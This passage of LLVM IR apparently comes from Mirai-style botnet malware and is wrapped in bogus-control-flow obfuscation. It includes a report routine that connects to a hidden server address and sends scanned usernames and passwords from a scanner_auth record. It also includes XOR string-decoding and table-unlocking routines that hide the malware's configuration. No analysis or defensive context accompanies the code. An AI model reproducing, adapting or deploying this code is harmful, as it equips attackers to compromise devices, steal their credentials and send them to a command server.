; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %39

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* @x.75
  %24 = load i32, i32* @y.76
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i32, i32* @x.75
  %32 = load i32, i32* @y.76
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart2, %19
  call void @table_unlock_val(i8 zeroext 2)
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i32 0, i32 0)) #6
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  store i32 %41, i32* %43, align 4
  %44 = call i8* @table_retrieve_val(i32 2, i32* null)
  %45 = bitcast i8* %44 to i16*
  %46 = load i16, i16* %45, align 2
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  call void @table_lock_val(i8 zeroext 2)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %50 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %50, %struct.sockaddr** %49, align 8
  %51 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = call i32 @connect(i32 %48, %struct.sockaddr* %52, i32 16)
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %74

; <label>:55:                                     ; preds = %39
  %56 = load i32, i32* @x.75
  %57 = load i32, i32* @y.76
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %9, align 4
  %65 = call i32 @close(i32 %64)
  %66 = load i32, i32* @x.75
  %67 = load i32, i32* @y.76
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:74:                                     ; preds = %originalBBpart24, %39
  store i8 0, i8* %11, align 1
  %75 = load i32, i32* %9, align 4
  %76 = call i64 @send(i32 %75, i8* %11, i64 1, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = bitcast i32* %4 to i8*
  %79 = call i64 @send(i32 %77, i8* %78, i64 4, i32 16384)
  %80 = load i32, i32* %9, align 4
  %81 = bitcast i16* %5 to i8*
  %82 = call i64 @send(i32 %80, i8* %81, i64 2, i32 16384)
  %83 = load i32, i32* %9, align 4
  %84 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %85 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %84, i32 0, i32 4
  %86 = call i64 @send(i32 %83, i8* %85, i64 1, i32 16384)
  %87 = load i32, i32* %9, align 4
  %88 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %89 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %88, i32 0, i32 0
  %90 = load i8*, i8** %89, align 8
  %91 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %92 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %91, i32 0, i32 4
  %93 = load i8, i8* %92, align 4
  %94 = zext i8 %93 to i64
  %95 = call i64 @send(i32 %87, i8* %90, i64 %94, i32 16384)
  %96 = load i32, i32* %9, align 4
  %97 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %98 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %97, i32 0, i32 5
  %99 = call i64 @send(i32 %96, i8* %98, i64 1, i32 16384)
  %100 = load i32, i32* %9, align 4
  %101 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %102 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %101, i32 0, i32 1
  %103 = load i8*, i8** %102, align 8
  %104 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %105 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %104, i32 0, i32 5
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i64
  %108 = call i64 @send(i32 %100, i8* %103, i64 %107, i32 16384)
  %109 = load i32, i32* %9, align 4
  %110 = call i32 @close(i32 %109)
  br label %111

; <label>:111:                                    ; preds = %74, %18
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %22
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %112 = load i32, i32* %9, align 4
  %113 = call i32 @close(i32 %112)
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = load i32, i32* @x.79
  %4 = load i32, i32* @y.80
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  store i32* %1, i32** %12, align 8
  %15 = load i8*, i8** %11, align 8
  %16 = call i32 @util_strlen(i8* %15)
  %17 = load i32*, i32** %12, align 8
  store i32 %16, i32* %17, align 4
  %18 = load i32*, i32** %12, align 8
  %19 = load i32, i32* %18, align 4
  %20 = add nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = call noalias i8* @malloc(i64 %21) #6
  store i8* %22, i8** %14, align 8
  %23 = load i8*, i8** %14, align 8
  %24 = load i8*, i8** %11, align 8
  %25 = load i32*, i32** %12, align 8
  %26 = load i32, i32* %25, align 4
  %27 = add nsw i32 %26, 1
  call void @util_memcpy(i8* %23, i8* %24, i32 %27)
  store i32 0, i32* %13, align 4
  %28 = load i32, i32* @x.79
  %29 = load i32, i32* @y.80
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %36

; <label>:36:                                     ; preds = %originalBBpart246, %originalBBpart2
  %37 = load i32, i32* %13, align 4
  %38 = load i32*, i32** %12, align 8
  %39 = load i32, i32* %38, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %109

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* @x.79
  %43 = load i32, i32* @y.80
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %41
  %50 = load i8*, i8** %14, align 8
  %51 = load i32, i32* %13, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 222
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  %58 = load i8*, i8** %14, align 8
  %59 = load i32, i32* %13, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = xor i32 %63, 237
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %61, align 1
  %66 = load i8*, i8** %14, align 8
  %67 = load i32, i32* %13, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = xor i32 %71, 251
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %69, align 1
  %74 = load i8*, i8** %14, align 8
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = xor i32 %79, 175
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %77, align 1
  %82 = load i32, i32* @x.79
  %83 = load i32, i32* @y.80
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart237, label %originalBB13alteredBB

originalBBpart237:                                ; preds = %originalBB13
  br label %90

; <label>:90:                                     ; preds = %originalBBpart237
  %91 = load i32, i32* @x.79
  %92 = load i32, i32* @y.80
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %90
  %99 = load i32, i32* %13, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %13, align 4
  %101 = load i32, i32* @x.79
  %102 = load i32, i32* @y.80
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart246, label %originalBB39alteredBB

originalBBpart246:                                ; preds = %originalBB39
  br label %36

; <label>:109:                                    ; preds = %36
  %110 = load i8*, i8** %14, align 8
  ret i8* %110

originalBBalteredBB:                              ; preds = %originalBB, %2
  %111 = alloca i8*, align 8
  %112 = alloca i32*, align 8
  %113 = alloca i32, align 4
  %114 = alloca i8*, align 8
  store i8* %0, i8** %111, align 8
  store i32* %1, i32** %112, align 8
  %115 = load i8*, i8** %111, align 8
  %116 = call i32 @util_strlen(i8* %115)
  %117 = load i32*, i32** %112, align 8
  store i32 %116, i32* %117, align 4
  %118 = load i32*, i32** %112, align 8
  %119 = load i32, i32* %118, align 4
  %_ = sub i32 0, %119
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %119
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 %119, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 0, %119
  %gen6 = add i32 %_5, 1
  %120 = add nsw i32 %119, 1
  %121 = sext i32 %120 to i64
  %122 = call noalias i8* @malloc(i64 %121) #6
  store i8* %122, i8** %114, align 8
  %123 = load i8*, i8** %114, align 8
  %124 = load i8*, i8** %111, align 8
  %125 = load i32*, i32** %112, align 8
  %126 = load i32, i32* %125, align 4
  %_7 = sub i32 0, %126
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 %126, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 %126, 1
  %gen12 = mul i32 %_11, 1
  %127 = add nsw i32 %126, 1
  call void @util_memcpy(i8* %123, i8* %124, i32 %127)
  store i32 0, i32* %113, align 4
  br label %originalBB

originalBB13alteredBB:                            ; preds = %originalBB13, %41
  %128 = load i8*, i8** %14, align 8
  %129 = load i32, i32* %13, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %_14 = sub i32 0, %133
  %gen15 = add i32 %_14, 222
  %_16 = sub i32 %133, 222
  %gen17 = mul i32 %_16, 222
  %_18 = sub i32 %133, 222
  %gen19 = mul i32 %_18, 222
  %_20 = shl i32 %133, 222
  %_21 = shl i32 %133, 222
  %_22 = shl i32 %133, 222
  %_23 = sub i32 %133, 222
  %gen24 = mul i32 %_23, 222
  %_25 = shl i32 %133, 222
  %_26 = sub i32 %133, 222
  %gen27 = mul i32 %_26, 222
  %_28 = sub i32 0, %133
  %gen29 = add i32 %_28, 222
  %134 = xor i32 %133, 222
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %131, align 1
  %136 = load i8*, i8** %14, align 8
  %137 = load i32, i32* %13, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %_30 = sub i32 %141, 237
  %gen31 = mul i32 %_30, 237
  %142 = xor i32 %141, 237
  %143 = trunc i32 %142 to i8
  store i8 %143, i8* %139, align 1
  %144 = load i8*, i8** %14, align 8
  %145 = load i32, i32* %13, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = sext i8 %148 to i32
  %_32 = sub i32 %149, 251
  %gen33 = mul i32 %_32, 251
  %150 = xor i32 %149, 251
  %151 = trunc i32 %150 to i8
  store i8 %151, i8* %147, align 1
  %152 = load i8*, i8** %14, align 8
  %153 = load i32, i32* %13, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %_34 = sub i32 0, %157
  %gen35 = add i32 %_34, 175
  %158 = xor i32 %157, 175
  %159 = trunc i32 %158 to i8
  store i8 %159, i8* %155, align 1
  br label %originalBB13

originalBB39alteredBB:                            ; preds = %originalBB39, %90
  %160 = load i32, i32* %13, align 4
  %_40 = sub i32 0, %160
  %gen41 = add i32 %_40, 1
  %_42 = shl i32 %160, 1
  %_43 = sub i32 %160, 1
  %gen44 = mul i32 %_43, 1
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %13, align 4
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = load i32, i32* @x.83
  %3 = load i32, i32* @y.84
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.table_value*, align 8
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %17 = load i8, i8* %10, align 1
  %18 = zext i8 %17 to i64
  %19 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %18
  store %struct.table_value* %19, %struct.table_value** %12, align 8
  %20 = load i32, i32* @table_key, align 4
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %13, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 8
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %14, align 1
  %27 = load i32, i32* @table_key, align 4
  %28 = lshr i32 %27, 16
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %15, align 1
  %31 = load i32, i32* @table_key, align 4
  %32 = lshr i32 %31, 24
  %33 = and i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %16, align 1
  store i32 0, i32* %11, align 4
  %35 = load i32, i32* @x.83
  %36 = load i32, i32* @y.84
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %43

; <label>:43:                                     ; preds = %131, %originalBBpart2
  %44 = load i32, i32* @x.83
  %45 = load i32, i32* @y.84
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %43
  %52 = load i32, i32* %11, align 4
  %53 = load %struct.table_value*, %struct.table_value** %12, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  %58 = load i32, i32* @x.83
  %59 = load i32, i32* @y.84
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %57, label %66, label %134

; <label>:66:                                     ; preds = %originalBBpart244
  %67 = load i32, i32* @x.83
  %68 = load i32, i32* @y.84
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %66
  %75 = load i8, i8* %13, align 1
  %76 = zext i8 %75 to i32
  %77 = load %struct.table_value*, %struct.table_value** %12, align 8
  %78 = getelementptr inbounds %struct.table_value, %struct.table_value* %77, i32 0, i32 0
  %79 = load i8*, i8** %78, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = xor i32 %84, %76
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %82, align 1
  %87 = load i8, i8* %14, align 1
  %88 = zext i8 %87 to i32
  %89 = load %struct.table_value*, %struct.table_value** %12, align 8
  %90 = getelementptr inbounds %struct.table_value, %struct.table_value* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = xor i32 %96, %88
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %94, align 1
  %99 = load i8, i8* %15, align 1
  %100 = zext i8 %99 to i32
  %101 = load %struct.table_value*, %struct.table_value** %12, align 8
  %102 = getelementptr inbounds %struct.table_value, %struct.table_value* %101, i32 0, i32 0
  %103 = load i8*, i8** %102, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = xor i32 %108, %100
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %106, align 1
  %111 = load i8, i8* %16, align 1
  %112 = zext i8 %111 to i32
  %113 = load %struct.table_value*, %struct.table_value** %12, align 8
  %114 = getelementptr inbounds %struct.table_value, %struct.table_value* %113, i32 0, i32 0
  %115 = load i8*, i8** %114, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  %119 = load i8, i8* %118, align 1
  %120 = sext i8 %119 to i32
  %121 = xor i32 %120, %112
  %122 = trunc i32 %121 to i8
  store i8 %122, i8* %118, align 1
  %123 = load i32, i32* @x.83
  %124 = load i32, i32* @y.84
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart269, label %originalBB46alteredBB

originalBBpart269:                                ; preds = %originalBB46
  br label %131

; <label>:131:                                    ; preds = %originalBBpart269
  %132 = load i32, i32* %11, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %11, align 4
  br label %43

; <label>:134:                                    ; preds = %originalBBpart244
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %135 = alloca i8, align 1
  %136 = alloca i32, align 4
  %137 = alloca %struct.table_value*, align 8
  %138 = alloca i8, align 1
  %139 = alloca i8, align 1
  %140 = alloca i8, align 1
  %141 = alloca i8, align 1
  store i8 %0, i8* %135, align 1
  %142 = load i8, i8* %135, align 1
  %143 = zext i8 %142 to i64
  %144 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %143
  store %struct.table_value* %144, %struct.table_value** %137, align 8
  %145 = load i32, i32* @table_key, align 4
  %_ = sub i32 %145, 255
  %gen = mul i32 %_, 255
  %146 = and i32 %145, 255
  %147 = trunc i32 %146 to i8
  store i8 %147, i8* %138, align 1
  %148 = load i32, i32* @table_key, align 4
  %_1 = sub i32 %148, 8
  %gen2 = mul i32 %_1, 8
  %_3 = shl i32 %148, 8
  %_4 = shl i32 %148, 8
  %_5 = shl i32 %148, 8
  %_6 = shl i32 %148, 8
  %_7 = shl i32 %148, 8
  %_8 = sub i32 0, %148
  %gen9 = add i32 %_8, 8
  %_10 = sub i32 %148, 8
  %gen11 = mul i32 %_10, 8
  %149 = lshr i32 %148, 8
  %_12 = sub i32 %149, 255
  %gen13 = mul i32 %_12, 255
  %_14 = sub i32 %149, 255
  %gen15 = mul i32 %_14, 255
  %_16 = sub i32 %149, 255
  %gen17 = mul i32 %_16, 255
  %_18 = sub i32 0, %149
  %gen19 = add i32 %_18, 255
  %_20 = sub i32 %149, 255
  %gen21 = mul i32 %_20, 255
  %_22 = sub i32 %149, 255
  %gen23 = mul i32 %_22, 255
  %150 = and i32 %149, 255
  %151 = trunc i32 %150 to i8
  store i8 %151, i8* %139, align 1
  %152 = load i32, i32* @table_key, align 4
  %_24 = shl i32 %152, 16
  %153 = lshr i32 %152, 16
  %_25 = sub i32 0, %153
  %gen26 = add i32 %_25, 255
  %_27 = sub i32 %153, 255
  %gen28 = mul i32 %_27, 255
  %154 = and i32 %153, 255
  %155 = trunc i32 %154 to i8
  store i8 %155, i8* %140, align 1
  %156 = load i32, i32* @table_key, align 4
  %_29 = sub i32 %156, 24
  %gen30 = mul i32 %_29, 24
  %_31 = shl i32 %156, 24
  %_32 = sub i32 %156, 24
  %gen33 = mul i32 %_32, 24
  %_34 = shl i32 %156, 24
  %_35 = sub i32 0, %156
  %gen36 = add i32 %_35, 24
  %_37 = shl i32 %156, 24
  %157 = lshr i32 %156, 24
  %_38 = sub i32 0, %157
  %gen39 = add i32 %_38, 255
  %_40 = sub i32 %157, 255
  %gen41 = mul i32 %_40, 255
  %158 = and i32 %157, 255
  %159 = trunc i32 %158 to i8
  store i8 %159, i8* %141, align 1
  store i32 0, i32* %136, align 4
  br label %originalBB

originalBB42alteredBB:                            ; preds = %originalBB42, %43
  %160 = load i32, i32* %11, align 4
  %161 = load %struct.table_value*, %struct.table_value** %12, align 8
  %162 = getelementptr inbounds %struct.table_value, %struct.table_value* %161, i32 0, i32 1
  %163 = load i16, i16* %162, align 8
  %164 = zext i16 %163 to i32
  %165 = icmp slt i32 %160, %164
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %66
  %166 = load i8, i8* %13, align 1
  %167 = zext i8 %166 to i32
  %168 = load %struct.table_value*, %struct.table_value** %12, align 8
  %169 = getelementptr inbounds %struct.table_value, %struct.table_value* %168, i32 0, i32 0
  %170 = load i8*, i8** %169, align 8
  %171 = load i32, i32* %11, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i8, i8* %170, i64 %172
  %174 = load i8, i8* %173, align 1
  %175 = sext i8 %174 to i32
  %_47 = sub i32 0, %175
  %gen48 = add i32 %_47, %167
  %_49 = sub i32 0, %175
  %gen50 = add i32 %_49, %167
  %176 = xor i32 %175, %167
  %177 = trunc i32 %176 to i8
  store i8 %177, i8* %173, align 1
  %178 = load i8, i8* %14, align 1
  %179 = zext i8 %178 to i32
  %180 = load %struct.table_value*, %struct.table_value** %12, align 8
  %181 = getelementptr inbounds %struct.table_value, %struct.table_value* %180, i32 0, i32 0
  %182 = load i8*, i8** %181, align 8
  %183 = load i32, i32* %11, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds i8, i8* %182, i64 %184
  %186 = load i8, i8* %185, align 1
  %187 = sext i8 %186 to i32
  %_51 = sub i32 %187, %179
  %gen52 = mul i32 %_51, %179
  %_53 = sub i32 0, %187
  %gen54 = add i32 %_53, %179
  %_55 = shl i32 %187, %179
  %_56 = sub i32 %187, %179
  %gen57 = mul i32 %_56, %179
  %188 = xor i32 %187, %179
  %189 = trunc i32 %188 to i8
  store i8 %189, i8* %185, align 1
  %190 = load i8, i8* %15, align 1
  %191 = zext i8 %190 to i32
  %192 = load %struct.table_value*, %struct.table_value** %12, align 8
  %193 = getelementptr inbounds %struct.table_value, %struct.table_value* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds i8, i8* %194, i64 %196
  %198 = load i8, i8* %197, align 1
  %199 = sext i8 %198 to i32
  %_58 = sub i32 %199, %191
  %gen59 = mul i32 %_58, %191
  %_60 = sub i32 0, %199
  %gen61 = add i32 %_60, %191
  %_62 = sub i32 %199, %191
  %gen63 = mul i32 %_62, %191
  %200 = xor i32 %199, %191
  %201 = trunc i32 %200 to i8
  store i8 %201, i8* %197, align 1
  %202 = load i8, i8* %16, align 1
  %203 = zext i8 %202 to i32
  %204 = load %struct.table_value*, %struct.table_value** %12, align 8
  %205 = getelementptr inbounds %struct.table_value, %struct.table_value* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds i8, i8* %206, i64 %208
  %210 = load i8, i8* %209, align 1
  %211 = sext i8 %210 to i32
  %_64 = shl i32 %211, %203
  %_65 = shl i32 %211, %203
  %_66 = sub i32 0, %211
  %gen67 = add i32 %_66, %203
  %212 = xor i32 %211, %203
  %213 = trunc i32 %212 to i8
  store i8 %213, i8* %209, align 1
  br label %originalBB46
}

